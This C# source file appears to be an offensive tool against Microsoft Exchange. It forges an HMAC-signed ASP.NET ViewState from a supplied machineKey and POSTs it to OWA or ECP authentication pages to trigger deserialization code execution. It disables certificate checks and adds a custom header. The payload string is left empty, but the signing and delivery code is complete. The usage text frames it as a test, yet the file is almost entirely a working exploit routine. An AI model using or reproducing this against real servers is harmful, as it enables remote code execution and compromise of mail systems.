using System;
using System.Text;
using System.IO;
using System.Security.Cryptography;
using System.Net;
using System.Web;
using System.Globalization;
using System.Security.Cryptography.X509Certificates;

namespace SharpExchangeDeserializeShelltest
{

    public class Program
    {
        static byte[] strToHexByte(string hexString) 
        {             
            if ((hexString.Length % 2) != 0) 
                hexString += " "; 
            byte[] returnBytes = new byte[hexString.Length / 2]; 
            for (int i = 0; i < returnBytes.Length; i++) 
                returnBytes[i] = Convert.ToByte(hexString.Substring(i * 2, 2), 16); 
            return returnBytes; 
        }

        static string CreateViewState(byte[] dat,string generator,string key)
        {
            MemoryStream ms = new MemoryStream();    
            byte[] validationKey= strToHexByte(key);

            uint _clientstateid = 0;
            if(!uint.TryParse(generator, NumberStyles.HexNumber, CultureInfo.InvariantCulture, out _clientstateid))
            {
                System.Environment.Exit(0);
            }
 
            byte[] _mackey = new byte[4];
            _mackey[0] = (byte)_clientstateid;
            _mackey[1] = (byte)(_clientstateid >> 8);
            _mackey[2] = (byte)(_clientstateid >> 16);
            _mackey[3] = (byte)(_clientstateid >> 24);

            ms = new MemoryStream();
            ms.Write(dat,0,dat.Length);
            ms.Write(_mackey,0,_mackey.Length);
            byte[] hash=(new HMACSHA1(validationKey)).ComputeHash(ms.ToArray());
            ms=new MemoryStream();
            ms.Write(dat,0,dat.Length);
            ms.Write(hash,0,hash.Length);
            return Convert.ToBase64String(ms.ToArray());
        }

        public static void ShowUsage()
        {
            string Usage = @"
Use to test the deserializing code execution of Exchange.            

You should modify the machineKey in %ExchangeInstallPath%\FrontEnd\HttpProxy\<path>\web.config to implement deserializing code execution.
<path>:owa or ecp

Usage:
    <url> <key> <path>
<path>: owa or ecp

eg.    
    192.168.1.1 CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF owa
    mail.test.com CB2721ABDAF8E9DC516D621D8B8BF13A2C9E8689A25303BF ecp    

";
            Console.WriteLine(Usage);
        }

        public static void Main(string[] args)
        {

            if(args.Length!=3)
            {
                ShowUsage();
                System.Environment.Exit(0);
            }            
            try
            {            
                ServicePointManager.ServerCertificateValidationCallback = (sender, certificate, chain, sslPolicyErrors) => { return true; };
                
                string targeturl = "";
                string generator = "";   
                if(args[2] =="owa")
                {
                    targeturl = "https://" + args[0] + "/owa/auth/errorFE.aspx";
                    generator = "042A94E8";

                }
                else if(args[2] =="ecp")
                {
                    targeturl = "https://" + args[0] + "/ecp/auth/TimeoutLogout.aspx";
                    generator = "277B1C2A";
                }
                else
                {
                    Console.WriteLine("[!] Wrong input");
                    System.Environment.Exit(0);
                }
                string key = args[1];
                Console.WriteLine("[*] TargetURL: " + targeturl);
                Console.WriteLine();                
            

                string xaml_payload2 = "";

                byte[] payload2 = System.Convert.FromBase64String(xaml_payload2);
                string data2 = CreateViewState(payload2, generator, key);
  
                HttpWebRequest hwr = WebRequest.Create(targeturl) as HttpWebRequest;
                hwr.AllowAutoRedirect = false;
                hwr.Method = "POST";
                hwr.UserAgent = "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36xxxxx";
                hwr.ContentType = "application/x-www-form-urlencoded";
                hwr.Headers.Add("Value", "00HGAT3K0AXHV2RF2W0G");
                hwr.Proxy = null;
                byte[] post = Encoding.UTF8.GetBytes("__VIEWSTATE="+HttpUtility.UrlEncode(data2)+"&__VIEWSTATEGENERATOR="+generator);
                hwr.ContentLength = post.Length;
                hwr.GetRequestStream().Write(post,0,post.Length);
                HttpWebResponse res = hwr.GetResponse() as HttpWebResponse;
                Console.WriteLine(res.StatusCode);

                for(int i=0;i<res.Headers.Keys.Count;i++)
                {
                    Console.WriteLine(String.Format("{0,-20}{1}",res.Headers.Keys[i],res.Headers.Get(i)));
                }

                Stream instream = res.GetResponseStream();
                StreamReader sr = new StreamReader(instream, Encoding.UTF8);    
                string content = sr.ReadToEnd();                    
                Console.WriteLine(content);       
               
            }
           
            catch (Exception e)
            {
                Console.WriteLine("{0}", e.Message);
                System.Environment.Exit(0);
            }
        }

    }
}